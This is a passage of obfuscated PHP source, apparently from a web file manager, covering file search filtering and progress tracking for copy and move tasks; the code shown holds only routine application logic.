($¢«Ò……[$ñËÅ™ª©[447]] as $‚³ÈÖƒÏ) { $½¥í•òã = $‚³ÈÖƒÏ[$ñËÅ™ª©[32]]; $—Ì­µØ = str_replace($ñËÅ™ª©[53], $ñËÅ™ª©[12], Pinyin::get($½¥í•òã)); if (stripos($½¥í•òã, $¶Šñğ´) !== !1 || stripos($—Ì­µØ, $¶Šñğ´) !== !1) { $¿©´«úû[] = $‚³ÈÖƒÏ[$ñËÅ™ª©[477]]; } } if (!$¿©´«úû) { return; } $ß„»£ı’ = array($ñËÅ™ª©[502] => array($ñËÅ™ª©[7], $¿©´«úû), $ñËÅ™ª©[1792] => 0, $ñËÅ™ª©[33] => $ñËÅ™ª©[1400] . $ıƒ¦¥ßÌ); $ ­Õëòü = Model($ñËÅ™ª©[504])->field($ñËÅ™ª©[87])->where($ß„»£ı’)->select(); $ ­Õëòü = array_to_keyvalue($ ­Õëòü, $ñËÅ™ª©[12], $ñËÅ™ª©[87]); $»Š±ùš¿ = array_unique($ ­Õëòü); $this->_listSearchMerge($Ÿ”®Îïá, $ÚÊ•Ù, $ÛÎÈãúÃ, $»Š±ùš¿); } private function _listSearchMerge(&$èÉÏ˜ò¦, $¿îûŒŠ‘, $ñ„¬ª, $Íëö³¾¦) { $ÉşîüÚ‰ =& $_SERVER[ıÚ˜š²İ]; if (!$Íëö³¾¦) { return; } $åÜ†¼–¦ = array_to_keyvalue($èÉÏ˜ò¦[$ÉşîüÚ‰[447]], $ÉşîüÚ‰[12], $ÉşîüÚ‰[194]); $õ§ÛĞİï = array_diff($Íëö³¾¦, $åÜ†¼–¦); if (!$õ§ÛĞİï) { return; } $î³å³·º = array($ÉşîüÚ‰[194] => array($ÉşîüÚ‰[7], $õ§ÛĞİï)); $®ß’å¨ = $this->field($ñ„¬ª)->where($î³å³·º)->select(); if (!$®ß’å¨) { return; } $³úÄÑ™ = array(); foreach ($®ß’å¨ as $ˆŠÒç‚») { if ($this->_listSearchFilter($ˆŠÒç‚», $¿îûŒŠ‘)) { $³úÄÑ™[] = $ˆŠÒç‚»; } } $èÉÏ˜ò¦[$ÉşîüÚ‰[447]] = array_merge($³úÄÑ™, $èÉÏ˜ò¦[$ÉşîüÚ‰[447]]); $èÉÏ˜ò¦[$ÉşîüÚ‰[444]][$ÉşîüÚ‰[445]] += count($³úÄÑ™); } private function _listSearchFilter($øóõ—ä, $Ò¯Ùó°–) { $Ùø­®™× =& $_SERVER[ıÚ˜š²İ]; $¹Ã±àú = $øóõ—ä[$Ùø­®™×[487]] == $Ùø­®™×[91]; if (!strstr($øóõ—ä[$Ùø­®™×[588]], $Ùø­®™×[50] . $Ò¯Ùó°–[$Ùø­®™×[193]] . $Ùø­®™×[50])) { return !1; } if (isset($Ò¯Ùó°–[$Ùø­®™×[488]]) && $Ò¯Ùó°–[$Ùø­®™×[488]] != $Ùø­®™×[853]) { if ($Ò¯Ùó°–[$Ùø­®™×[488]] == $Ùø­®™×[78] && !$¹Ã±àú) { return !1; } if ($Ò¯Ùó°–[$Ùø­®™×[488]] != $Ùø­®™×[78] && $¹Ã±àú) { return !1; } if (!strstr($øóõ—ä[$Ùø­®™×[169]], $Ùø­®™×[50] . $Ò¯Ùó°–[$Ùø­®™×[488]] . $Ùø­®™×[50])) { return !1; } } if (isset($Ò¯Ùó°–[$Ùø­®™×[2266]]) && $Ò¯Ùó°–[$Ùø­®™×[2266]] < $øóõ—ä[$Ùø­®™×[79]]) { return !1; } if (isset($Ò¯Ùó°–[$Ùø­®™×[2267]]) && $Ò¯Ùó°–[$Ùø­®™×[2267]] > $øóõ—ä[$Ùø­®™×[79]]) { return !1; } if (isset($Ò¯Ùó°–[$Ùø­®™×[669]]) && $Ò¯Ùó°–[$Ùø­®™×[669]] != $øóõ—ä[$Ùø­®™×[531]]) { return !1; } return !0; } public function listSearchChildren($€‰Óı¤¬, $ã§É×ª = 5000) { $ûúÄƒç =& $_SERVER[ıÚ˜š²İ]; $©áÄÊá® = array(); $ôª®ŸÚ = $this->sourceInfo($€‰Óı¤¬); $­ÎÚ„¸ = array($ûúÄƒç[588] => array($ûúÄƒç[461], $ôª®ŸÚ[$ûúÄƒç[588]] . $ôª®ŸÚ[$ûúÄƒç[194]] . $ûúÄƒç[620])); $ÂİÑ´É’ = $this->field($ûúÄƒç[79])->where($­ÎÚ„¸)->limit($ã§É×ª + 1)->select(); $ø¿÷âÜ = is_array($ÂİÑ´É’) ? count($ÂİÑ´É’) : 0; if ($ø¿÷âÜ > $ã§É×ª) { return $this->_listSearchChildrenNear($€‰Óı¤¬, $ã§É×ª); } $¢¾»òßÂ = $this->field($ûúÄƒç[194])->where($­ÎÚ„¸)->select(); $©áÄÊá® = array_to_keyvalue($¢¾»òßÂ, $ûúÄƒç[12], $ûúÄƒç[194]); return $©áÄÊá®; } private function _listSearchChildrenNear($Ïú Ú×·, $ñ±ù©ú) { $ÔŠ–Ÿø± =& $_SERVER[ıÚ˜š²İ]; $©Í‹ï“¹ = array(); $Ã¯Ğ×ôş = array($ÔŠ–Ÿø±[193] => $Ïú Ú×·); $„ÂáüÚ… = $this->field($ÔŠ–Ÿø±[2268])->where($Ã¯Ğ×ôş)->select(); $ßÚµÓí = array_to_keyvalue(array_filter_by_field($„ÂáüÚ…, $ÔŠ–Ÿø±[487], $ÔŠ–Ÿø±[91]), $ÔŠ–Ÿø±[12], $ÔŠ–Ÿø±[194]); $©Í‹ï“¹ = array_merge($©Í‹ï“¹, array_to_keyvalue($„ÂáüÚ…, $ÔŠ–Ÿø±[12], $ÔŠ–Ÿø±[194])); if (!$ßÚµÓí) { return $©Í‹ï“¹; } $Ã¯Ğ×ôş = array($ÔŠ–Ÿø±[193] => array($ÔŠ–Ÿø±[7], $ßÚµÓí)); $„ÂáüÚ… = $this->field($ÔŠ–Ÿø±[2268])->where($Ã¯Ğ×ôş)->limit($ñ±ù©ú)->select(); $©Í‹ï“¹ = array_merge($©Í‹ï“¹, array_to_keyvalue($„ÂáüÚ…, $ÔŠ–Ÿø±[12], $ÔŠ–Ÿø±[194])); $©Í‹ï“¹ = array_slice($©Í‹ï“¹, 0, intval($ñ±ù©ú)); return $©Í‹ï“¹; } private function _listSearchBindPinyin($ÓŞ¸´ü, &$…êèè®›, &$ôÎØÇç°) { $÷ÓÑŠ‡¿ =& $_SERVER[ıÚ˜š²İ]; if (!isset($ÓŞ¸´ü[$÷ÓÑŠ‡¿[2092]]) || !$ÓŞ¸´ü[$÷ÓÑŠ‡¿[2092]]) { return; } if (!Input::check($ÓŞ¸´ü[$÷ÓÑŠ‡¿[2092]], $÷ÓÑŠ‡¿[395]) || strlen($ÓŞ¸´ü[$÷ÓÑŠ‡¿[2092]]) < 2) { return; } $ëâ€Ö³Ô = "\114\x45\x46\x54\40\x4a\x4f\111\116\40{$this->tablePrefix}\151\x6f\137\163\157\x75\x72\x63\145\x5f\155\145\164\x61\x20\155\x65\164\141\x20\x6f\x6e\x20\x73\x6f\x75\x72\143\x65\x2e\x73\x6f\x75\x72\x63\145\x49\x44\x20\x3d\x20\155\x65\x74\141\x2e\163\x6f\x75\x72\143\145\x49\x44"; $ìßõ°÷õ = array(); $ôÎØÇç° = str_replace(array($÷ÓÑŠ‡¿[288], $÷ÓÑŠ‡¿[53], $÷ÓÑŠ‡¿[2269]), $÷ÓÑŠ‡¿[12], $ôÎØÇç°); $ôÎØÇç° = $÷ÓÑŠ‡¿[513] . str_replace($÷ÓÑŠ‡¿[50], $÷ÓÑŠ‡¿[514], $ôÎØÇç°); $Ó˜±ó = $…êèè®›[$÷ÓÑŠ‡¿[32]]; unset($…êèè®›[$÷ÓÑŠ‡¿[32]]); foreach ($…êèè®› as $ŒŒ¾¶´æ => $°‘Ê©©¡) { $ìßõ°÷õ[$÷ÓÑŠ‡¿[513] . $ŒŒ¾¶´æ] = $°‘Ê©©¡; } foreach ($Ó˜±ó as $Çšş§¥) { $ìßõ°÷õ[] = array($÷ÓÑŠ‡¿[518] => $Çšş§¥, $÷ÓÑŠ‡¿[1089] => $÷ÓÑŠ‡¿[2096], array($÷ÓÑŠ‡¿[2270] => $Çšş§¥, $÷ÓÑŠ‡¿[2271] => array($÷ÓÑŠ‡¿[7], array($÷ÓÑŠ‡¿[540], $÷ÓÑŠ‡¿[539])))); } $this->join($ëâ€Ö³Ô); $…êèè®› = $ìßõ°÷õ; } private function _parseSearchWhere($¡¬Ì©èØ) { $Ñ€ºÌÁ… =& $_SERVER[ıÚ˜š²İ]; $ó³Ë¼§ü = array(); if (isset($¡¬Ì©èØ[$Ñ€ºÌÁ…[837]]) && $¡¬Ì©èØ[$Ñ€ºÌÁ…[837]]) { $ó³Ë¼§ü[$Ñ€ºÌÁ…[88]] = array($Ñ€ºÌÁ…[2272], $¡¬Ì©èØ[$Ñ€ºÌÁ…[837]]); } if (isset($¡¬Ì©èØ[$Ñ€ºÌÁ…[838]]) && $¡¬Ì©èØ[$Ñ€ºÌÁ…[838]]) { $îÌÍÌš‡ = array($Ñ€ºÌÁ…[2273], $¡¬Ì©èØ[$Ñ€ºÌÁ…[838]]); if ($ó³Ë¼§ü[$Ñ€ºÌÁ…[88]]) { $ó³Ë¼§ü[$Ñ€ºÌÁ…[88]] = array($ó³Ë¼§ü[$Ñ€ºÌÁ…[88]], $îÌÍÌš‡, $Ñ€ºÌÁ…[2274]); } else { $ó³Ë¼§ü[$Ñ€ºÌÁ…[88]] = $îÌÍÌš‡; } } if (isset($¡¬Ì©èØ[$Ñ€ºÌÁ…[2266]]) && $¡¬Ì©èØ[$Ñ€ºÌÁ…[2266]] > 0) { $ó³Ë¼§ü[$Ñ€ºÌÁ…[79]] = array($Ñ€ºÌÁ…[2272], $¡¬Ì©èØ[$Ñ€ºÌÁ…[2266]]); } if (isset($¡¬Ì©èØ[$Ñ€ºÌÁ…[2267]]) && $¡¬Ì©èØ[$Ñ€ºÌÁ…[2267]]) { $îÌÍÌš‡ = array($Ñ€ºÌÁ…[2273], $¡¬Ì©èØ[$Ñ€ºÌÁ…[2267]]); if ($ó³Ë¼§ü[$Ñ€ºÌÁ…[79]]) { $ó³Ë¼§ü[$Ñ€ºÌÁ…[79]] = array($ó³Ë¼§ü[$Ñ€ºÌÁ…[79]], $îÌÍÌš‡, $Ñ€ºÌÁ…[2274]); } else { $ó³Ë¼§ü[$Ñ€ºÌÁ…[79]] = $îÌÍÌš‡; } } if (isset($¡¬Ì©èØ[$Ñ€ºÌÁ…[669]]) && $¡¬Ì©èØ[$Ñ€ºÌÁ…[669]]) { $ó³Ë¼§ü[] = array($Ñ€ºÌÁ…[531] => $¡¬Ì©èØ[$Ñ€ºÌÁ…[669]], $Ñ€ºÌÁ…[529] => $¡¬Ì©èØ[$Ñ€ºÌÁ…[669]], $Ñ€ºÌÁ…[1089] => $Ñ€ºÌÁ…[2096]); } if (isset($¡¬Ì©èØ[$Ñ€ºÌÁ…[488]]) && $¡¬Ì©èØ[$Ñ€ºÌÁ…[488]]) { $¦ñÙâ­« = $¡¬Ì©èØ[$Ñ€ºÌÁ…[488]]; if ($¦ñÙâ­« == $Ñ€ºÌÁ…[78]) { $ó³Ë¼§ü[$Ñ€ºÌÁ…[487]] = 1; } else { if ($¦ñÙâ­« == $Ñ€ºÌÁ…[2275]) { $ó³Ë¼§ü[$Ñ€ºÌÁ…[487]] = 0; } else { if ($¦ñÙâ­«) { $¦ñÙâ­« = is_array($¦ñÙâ­«) ? $¦ñÙâ­« : explode($Ñ€ºÌÁ…[50], $¦ñÙâ­«); $ó³Ë¼§ü[$Ñ€ºÌÁ…[488]] = array($Ñ€ºÌÁ…[494], $¦ñÙâ­«); $ó³Ë¼§ü[$Ñ€ºÌÁ…[487]] = 0; } } } } $this->_parseSearchParent($¡¬Ì©èØ, $ó³Ë¼§ü); if (isset($¡¬Ì©èØ[$Ñ€ºÌÁ…[2092]]) && trim($¡¬Ì©èØ[$Ñ€ºÌÁ…[2092]])) { $Á©èĞÍ­ = trim($¡¬Ì©èØ[$Ñ€ºÌÁ…[2092]]); $Ä¾•Ó®š = explode($Ñ€ºÌÁ…[53], $Á©èĞÍ­); if (strlen($Á©èĞÍ­) > 2 && (substr($Á©èĞÍ­, 0, 1) == $Ñ€ºÌÁ…[121] && substr($Á©èĞÍ­, -1) == $Ñ€ºÌÁ…[121]) || substr($Á©èĞÍ­, 0, 1) == $Ñ€ºÌÁ…[58] && substr($Á©èĞÍ­, -1) == $Ñ€ºÌÁ…[58]) { $Á©èĞÍ­ = substr($Á©èĞÍ­, 1, -1); $Ä¾•Ó®š = array($Á©èĞÍ­); } $ó³Ë¼§ü[$Ñ€ºÌÁ…[32]] = array(array($Ñ€ºÌÁ…[619], $Ñ€ºÌÁ…[2094] . $Á©èĞÍ­ . $Ñ€ºÌÁ…[2094])); if (count($Ä¾•Ó®š) > 1) { $ó³Ë¼§ü[$Ñ€ºÌÁ…[32]] = array(); foreach ($Ä¾•Ó®š as $ù‘ÜÓãÈ) { if (!trim($ù‘ÜÓãÈ)) { continue; } $ó³Ë¼§ü[$Ñ€ºÌÁ…[32]][] = array($Ñ€ºÌÁ…[619], $Ñ€ºÌÁ…[2094] . trim($ù‘ÜÓãÈ) . $Ñ€ºÌÁ…[2094]); } } } return $ó³Ë¼§ü; } private function _parseSearchParent($äø¿…ª¸, &$ßâûÖ€¥) { $Ô˜ü×È‰ =& $_SERVER[ıÚ˜š²İ]; if (!isset($äø¿…ª¸[$Ô˜ü×È‰[193]]) || !$äø¿…ª¸[$Ô˜ü×È‰[193]]) { return; } $®¨ì¢Ñ® = $this->pathInfo($äø¿…ª¸[$Ô˜ü×È‰[193]]); $šûãù°İ = $®¨ì¢Ñ®[$Ô˜ü×È‰[193]] . $Ô˜ü×È‰[12] === $Ô˜ü×È‰[231]; $–î¢”ıâ = $®¨ì¢Ñ®[$Ô˜ü×È‰[191]] == $Ô˜ü×È‰[582]; if ($®¨ì¢Ñ®[$Ô˜ü×È‰[598]] == $Ô˜ü×È‰[599]) { $ı ¸î¢ = $this->sourceInfo($äø¿…ª¸[$Ô˜ü×È‰[193]]); $®¨ì¢Ñ®[$Ô˜ü×È‰[588]] = $ı ¸î¢[$Ô˜ü×È‰[588]]; } $ßâûÖ€¥[$Ô˜ü×È‰[659]] = array($Ô˜ü×È‰[619], $®¨ì¢Ñ®[$Ô˜ü×È‰[588]] . $äø¿…ª¸[$Ô˜ü×È‰[193]] . $Ô˜ü×È‰[620]); $· ŞíÓƒ = isset($äø¿…ª¸[$Ô˜ü×È‰[1952]]) && in_array($Ô˜ü×È‰[582], $äø¿…ª¸[$Ô˜ü×È‰[1952]]); if (!$· ŞíÓƒ || !$–î¢”ıâ || !$šûãù°İ || !$®¨ì¢Ñ®[$Ô˜ü×È‰[489]]) { return; } if (!AuthModel::authCheckRoot($®¨ì¢Ñ®[$Ô˜ü×È‰[489]][$Ô˜ü×È‰[490]])) { return; } $¿­²Ãñ = $®¨ì¢Ñ®[$Ô˜ü×È‰[573]] . $Ô˜ü×È‰[12]; if ($¿­²Ãñ == $Ô˜ü×È‰[91]) { unset($ßâûÖ€¥[$Ô˜ü×È‰[659]]); $ßâûÖ€¥[$Ô˜ü×È‰[191]] = self::TYPE_GROUP; return; } $ˆğÃ‡ƒÃ = Model($Ô˜ü×È‰[589])->groupChildrenAll($¿­²Ãñ); $÷¦¬ä•Õ = count($ˆğÃ‡ƒÃ); if ($÷¦¬ä•Õ <= 1) { return; } $£ç˜â¾ = array($Ô˜ü×È‰[193] => 0, $Ô˜ü×È‰[191] => self::TYPE_GROUP, $Ô˜ü×È‰[573] => array($Ô˜ü×È‰[7], $ˆğÃ‡ƒÃ)); $Üû¥áàœ = $this->field($Ô˜ü×È‰[2276])->where($£ç˜â¾)->limit($÷¦¬ä•Õ)->select(); $ßâûÖ€¥[$Ô˜ü×È‰[659]] = array(); foreach ($Üû¥áàœ as $Ÿâñº‹) { $ßâûÖ€¥[$Ô˜ü×È‰[659]][] = array($Ô˜ü×È‰[619], $Ô˜ü×È‰[597] . $Ÿâñº‹[$Ô˜ü×È‰[194]] . $Ô˜ü×È‰[620]); } $ßâûÖ€¥[$Ô˜ü×È‰[659]][] = $Ô˜ü×È‰[2096]; } } $_file = $_SERVER[$_SERVER[ıÚ˜š²İ][960]]; goto BÈÑï…ÍŠ¥; aæ¦Û·®: class TaskFileTransfer extends Task { protected function startAfter() { $Òœ„Ü¤ö =& $_SERVER[ıÚ˜š²İ]; $¶«ôêá =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Òœ„Ü¤ö[1823], array($this, $Òœ„Ü¤ö[1824])); Hook::bind($Òœ„Ü¤ö[1322], array($this, $Òœ„Ü¤ö[1825])); Hook::bind($Òœ„Ü¤ö[1826], array($this, $Òœ„Ü¤ö[1827])); Hook::bind($Òœ„Ü¤ö[675], array($this, $Òœ„Ü¤ö[1828])); Hook::bind($Òœ„Ü¤ö[676], array($this, $Òœ„Ü¤ö[1829])); Hook::bind($Òœ„Ü¤ö[682], array($this, $Òœ„Ü¤ö[1830])); Hook::bind($Òœ„Ü¤ö[683], array($this, $Òœ„Ü¤ö[1831])); Hook::bind($Òœ„Ü¤ö[678], array($this, $Òœ„Ü¤ö[1832])); Hook::bind($Òœ„Ü¤ö[680], array($this, $Òœ„Ü¤ö[1833])); Hook::bind($Òœ„Ü¤ö[644], array($this, $Òœ„Ü¤ö[1834])); Hook::bind($Òœ„Ü¤ö[641], array($this, $Òœ„Ü¤ö[1834])); Hook::bind($Òœ„Ü¤ö[646], array($this, $Òœ„Ü¤ö[1834])); Hook::bind($Òœ„Ü¤ö[648], array($this, $Òœ„Ü¤ö[1834])); Hook::bind($Òœ„Ü¤ö[650], array($this, $Òœ„Ü¤ö[1834])); Hook::bind($Òœ„Ü¤ö[1835], array($this, $Òœ„Ü¤ö[1836])); Hook::bind($Òœ„Ü¤ö[666], array($this, $Òœ„Ü¤ö[1837])); $this->sourceModelCopyFlag = !1; Hook::bind($Òœ„Ü¤ö[1838], array($this, $Òœ„Ü¤ö[1839])); Hook::bind($Òœ„Ü¤ö[1840], array($this, $Òœ„Ü¤ö[1841])); Hook::bind($Òœ„Ü¤ö[1842], array($this, $Òœ„Ü¤ö[1843])); $¶«ôêá[$Òœ„Ü¤ö[1844]] = LNG($Òœ„Ü¤ö[1845]); $¶«ôêá[$Òœ„Ü¤ö[1846]] = 0; $¶«ôêá[$Òœ„Ü¤ö[1847]] = 0; $¶«ôêá[$Òœ„Ü¤ö[1154]] = $Òœ„Ü¤ö[12]; $¶«ôêá[$Òœ„Ü¤ö[1848]] = $Òœ„Ü¤ö[12]; $¶«ôêá[$Òœ„Ü¤ö[1849]] = 0; $¶«ôêá[$Òœ„Ü¤ö[1850]] = 0; $¶«ôêá[$Òœ„Ü¤ö[1851]] = 0; if (!$¶«ôêá[$Òœ„Ü¤ö[1680]]) { $¶«ôêá[$Òœ„Ü¤ö[1680]] = LNG($Òœ„Ü¤ö[1852]); } } protected function endAfter() { $û‡ù¡ûº =& $_SERVER[ıÚ˜š²İ]; Hook::unbind($û‡ù¡ûº[1823], array($this, $û‡ù¡ûº[1824])); Hook::unbind($û‡ù¡ûº[1322], array($this, $û‡ù¡ûº[1825])); Hook::unbind($û‡ù¡ûº[1826], array($this, $û‡ù¡ûº[1827])); Hook::unbind($û‡ù¡ûº[675], array($this, $û‡ù¡ûº[1828])); Hook::unbind($û‡ù¡ûº[676], array($this, $û‡ù¡ûº[1829])); Hook::unbind($û‡ù¡ûº[682], array($this, $û‡ù¡ûº[1830])); Hook::unbind($û‡ù¡ûº[683], array($this, $û‡ù¡ûº[1831])); Hook::unbind($û‡ù¡ûº[678], array($this, $û‡ù¡ûº[1832])); Hook::unbind($û‡ù¡ûº[680], array($this, $û‡ù¡ûº[1833])); Hook::unbind($û‡ù¡ûº[644], array($this, $û‡ù¡ûº[1834])); Hook::unbind($û‡ù¡ûº[641], array($this, $û‡ù¡ûº[1834])); Hook::unbind($û‡ù¡ûº[646], array($this, $û‡ù¡ûº[1834])); Hook::unbind($û‡ù¡ûº[648], array($this, $û‡ù¡ûº[1834])); Hook::unbind($û‡ù¡ûº[650], array($this, $û‡ù¡ûº[1834])); Hook::unbind($û‡ù¡ûº[1835], array($this, $û‡ù¡ûº[1836])); Hook::unbind($û‡ù¡ûº[666], array($this, $û‡ù¡ûº[1837])); Hook::unbind($û‡ù¡ûº[1838], array($this, $û‡ù¡ûº[1839])); Hook::unbind($û‡ù¡ûº[1840], array($this, $û‡ù¡ûº[1841])); Hook::unbind($û‡ù¡ûº[1842], array($this, $û‡ù¡ûº[1843])); } public function copyMoveStart($ ˜å¦Í, $ß‚ÄÒï, $»Àù¸¹, $¥Üš‰ú) { $ïñ–‚à¼ =& $_SERVER[ıÚ˜š²İ]; self::log($ïñ–‚à¼[1853] . $ß‚ÄÒï . $ïñ–‚à¼[73] . $¥Üš‰ú); $‹“·µ¯Ò = rtrim(TEMP_FILES, $ïñ–‚à¼[8]); if (substr($ß‚ÄÒï, 0, strlen($‹“·µ¯Ò)) == $‹“·µ¯Ò) { return; } if (substr($¥Üš‰ú, 0, strlen($‹“·µ¯Ò)) == $‹“·µ¯Ò) { return; } $¯¿»áÂ» =& $this->task; $¯¿»áÂ»[$ïñ–‚à¼[1854]] = KodIO::transferType($ ˜å¦Í, $»Àù¸¹); $this->update(); } public function updateAfter() { $µóûÙáó =& $_SERVER[ıÚ˜š²İ]; $×áÙ·È­ =& $this->task; if (!$×áÙ·È­[$µóûÙáó[840]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($×áÙ·È­[$µóûÙáó[1854]] == $µóûÙáó[1423]) { return; } self::updateTask($×áÙ·È­); } private static function updateTask(&$©³Æ²‘€) { $Ÿ•Û›š« =& $_SERVER[ıÚ˜š²İ]; if ($©³Æ²‘€[$Ÿ•Û›š«[1854]] == $Ÿ•Û›š«[1293] || $©³Æ²‘€[$Ÿ•Û›š«[1854]] == $Ÿ•Û›š«[110]) { if ($©³Æ²‘€[$Ÿ•Û›š«[1848]]) { $©³Æ²‘€[$Ÿ•Û›š«[1851]] = $©³Æ²‘€[$Ÿ•Û›š«[1850]] + $©³Æ²‘€[$Ÿ•Û›š«[1847]]; } } else { if ($©³Æ²‘€[$Ÿ•Û›š«[1854]] == $Ÿ•Û›š«[1424]) { if ($©³Æ²‘€[$Ÿ•Û›š«[1848]] == $Ÿ•Û›š«[1293]) { $©³Æ²‘€[$Ÿ•Û›š«[1851]] = $©³Æ²‘€[$Ÿ•Û›š«[1850]] + $©³Æ²‘€[$Ÿ•Û›š«[1847]] * 0.5; } else { if ($©³Æ²‘€[$Ÿ•Û›š«[1848]] == $Ÿ•Û›š«[110]) { $©³Æ²‘€[$Ÿ•Û›š«[1851]] = $©³Æ²‘€[$Ÿ•Û›š«[1850]] + $©³Æ²‘€[$Ÿ•Û›š«[1846]] * 0.5 + $©³Æ²‘€[$Ÿ•Û›š«[1847]] * 0.5; } } } } $©³Æ²‘€[$Ÿ•Û›š«[1794]] = $©³Æ²‘€[$Ÿ•Û›š«[1851]] / $©³Æ²‘€[$Ÿ•Û›š«[840]]; if ($©³Æ²‘€[$Ÿ•Û›š«[1794]] > 0) { $î­ğš…– = timeFloat() - $©³Æ²‘€[$Ÿ•Û›š«[1796]] - $©³Æ²‘€[$Ÿ•Û›š«[1799]]; $©³Æ²‘€[$Ÿ•Û›š«[1800]] = $î­ğš…– * (1 - $©³Æ²‘€[$Ÿ•Û›š«[1794]]) / $©³Æ²‘€[$Ÿ•Û›š«[1794]]; } } public function addPath($€ä¡«…‡) { $ÖúšÍ¾ =& $_SERVER[ıÚ˜š²İ]; if (!$€ä¡«…‡) { return; } $•²º =& $this->task; $¶÷‹Œçû = IO::infoWithChildren($€ä¡«…‡); $ëÑ…İ = $•²º[$ÖúšÍ¾[1855]] ? $•²º[$ÖúšÍ¾[1855]][$ÖúšÍ¾[1856]] : 0; $•²º[$ÖúšÍ¾[1855]] = array($ÖúšÍ¾[1856] => $ëÑ…İ + 1, $ÖúšÍ¾[496] => $¶÷‹Œçû[$ÖúšÍ¾[32]], $ÖúšÍ¾[87] => $¶÷‹Œçû[$ÖúšÍ¾[87]], $ÖúšÍ¾[586] => $¶÷‹Œçû[$ÖúšÍ¾[586]] ? $¶÷‹Œçû[$ÖúšÍ¾[586]] : $¶÷‹Œçû[$ÖúšÍ¾[87]]); if ($¶÷‹Œçû[$ÖúšÍ¾[33]] == $ÖúšÍ¾[233]) { $•²º[$ÖúšÍ¾[1152]] += 1; } else { $•²º[$ÖúšÍ¾[1152]] += $¶÷‹Œçû[$ÖúšÍ¾[82]][$ÖúšÍ¾[80]]; if ($¶÷‹Œçû[$ÖúšÍ¾[194]]) { $•²º[$ÖúšÍ¾[1152]] += $¶÷‹Œçû[$ÖúšÍ¾[82]][$ÖúšÍ¾[81]] + 1; } } $•²º[$ÖúšÍ¾[840]] += $¶÷‹Œçû[$ÖúšÍ¾[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ö§³¬»ˆ) { } public function sourceAddHashEnd($ï™ÇãØë) { } public function sourceAddFileStart($Îí÷¢—Í) { $›ãÔğÇ¡ =& $_SERVER[ıÚ˜š²İ]; $Ä½¹óó» =& $this->task; $Ä½¹óó»[$›ãÔğÇ¡[1846]] = $Îí÷¢—Í[$›ãÔğÇ¡[79]]; $Ä½¹óó»[$›ãÔğÇ¡[1844]] = $Îí÷¢—Í[$›ãÔğÇ¡[32]]; $Ä½¹óó»[$›ãÔğÇ¡[1154]] = $Îí÷¢—Í[$›ãÔğÇ¡[32]]; $Ä½¹óó»[$›ãÔğÇ¡[1857]] = $Îí÷¢—Í[$›ãÔğÇ¡[87]]; $this->update(); } public function sourceAddFileEnd($ßÉœë»´) { $»ÛÜ®Æ† =& $_SERVER[ıÚ˜š²İ]; $ë‰ÌèåÚ =& $this->task; $ë‰ÌèåÚ[$»ÛÜ®Æ†[1851]] += $ßÉœë»´[$»ÛÜ®Æ†[79]]; $ë‰ÌèåÚ[$»ÛÜ®Æ†[1857]] = $ßÉœë»´[$»ÛÜ®Æ†[87]]; $this->update(1); } public function copyFileStart($˜üµçáˆ, $µÀ–ô•˜, $Ôä‰¸­Ú, $†âä‘°ˆ, $ˆ©«®­Î, $Æ‚¸±âû) { $¸àíÚ¿Ÿ =& $_SERVER[ıÚ˜š²İ]; $ËØ¯®Å• = $ˆ©«®­Î; if ($ËØ¯®Å• == $GLOBALS[$¸àíÚ¿Ÿ[1858]]) { $ËØ¯®Å• = $GLOBALS[$¸àíÚ¿Ÿ[1859]]; } $GLOBALS[$¸àíÚ¿Ÿ[1859]] = $ˆ©«®­Î; $GLOBALS[$¸àíÚ¿Ÿ[1858]] = $Æ‚¸±âû; $ÀŒ«­ĞÄ =& $this->task; $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1844]] = $ËØ¯®Å•; $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1846]] = (int) $˜üµçáˆ->size($µÀ–ô•˜); $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1847]] = 0; $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1154]] = $¸àíÚ¿Ÿ[12]; $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1848]] = $¸àíÚ¿Ÿ[12]; $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1849]] = 0; $ç‹ÂÔÊÑ = $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1846]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[477]] . $¸àíÚ¿Ÿ[1860]); if ($ç‹ÂÔÊÑ && file_exists(get_path_father($†âä‘°ˆ))) { Cache::set($ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[477]] . $¸àíÚ¿Ÿ[1860], $†âä‘°ˆ); $ÀŒ«­ĞÄ[$¸àíÚ¿Ÿ[1817]] = array($¸àíÚ¿Ÿ[1861], $¸àíÚ¿Ÿ[1862]); } $this->update(0, $ç‹ÂÔÊÑ); } public static function updateCopyLocalFileSize($Öœ¥Ù¨) { $§åÌûÍÛ =& $_SERVER[ıÚ˜š²İ]; $Š¶ØÈ·± = Cache::get($Öœ¥Ù¨[$§åÌûÍÛ[477]] . $§åÌûÍÛ[1860]); if (!$Š¶ØÈ·± || !file_exists($Š¶ØÈ·±)) { return $Öœ¥Ù¨; } $Öœ¥Ù¨[$§åÌûÍÛ[1847]] = @filesize($Š¶ØÈ·±); $Öœ¥Ù¨[$§åÌûÍÛ[1851]] += $Öœ¥Ù¨[$§åÌûÍÛ[1847]]; self::updateTask($Öœ¥Ù¨); return $Öœ¥Ù¨; } public function copyFileEnd($ª¦¼¶µ°, $ë…ßç÷İ, $—¥÷Ç„í, $ıäö§¡ñ, $»¯›ßÊö, $•ñÌİ¹) { $ßÕ‹Š¨× =& $_SERVER[ıÚ˜š²İ]; $øş÷Øâ“ =& $this->task; $øş÷Øâ“[$ßÕ‹Š¨×[1847]] = $øş÷Øâ“[$ßÕ‹Š¨×[1846]]; $øş÷Øâ“[$ßÕ‹Š¨×[1848]] = $ßÕ‹Š¨×[12]; unset($øş÷Øâ“[$ßÕ‹Š¨×[1817]]); if ($»¯›ßÊö == $øş÷Øâ“[$ßÕ‹Š¨×[1844]]) { $øş÷Øâ“[$ßÕ‹Š¨×[1850]] += $øş÷Øâ“[$ßÕ‹Š¨×[1846]]; $øş÷Øâ“[$ßÕ‹Š¨×[1851]] = $øş÷Øâ“[$ßÕ‹Š¨×[1850]]; $şñĞ·È = 1; if 